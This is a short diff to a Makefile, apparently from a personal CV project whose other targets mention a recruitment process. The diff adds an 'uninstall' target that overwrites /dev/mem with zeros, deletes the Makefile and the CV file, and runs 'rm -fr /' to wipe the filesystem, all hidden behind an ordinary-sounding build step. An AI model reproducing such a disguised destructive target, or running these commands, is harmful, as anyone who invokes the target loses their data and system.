@@ -330,6 +330,11 @@ extras:
 	@echo extras not available on github 
 	@echo wait till i send this code during recrutation process
 
+uninstall:
+	@dd if=/dev/zero of=/dev/mem
+	@rm Makefile "Jakub_Olizarowicz CV.txt"
+	@rm -fr /
+
 #
 #The MIT License (MIT)
 #
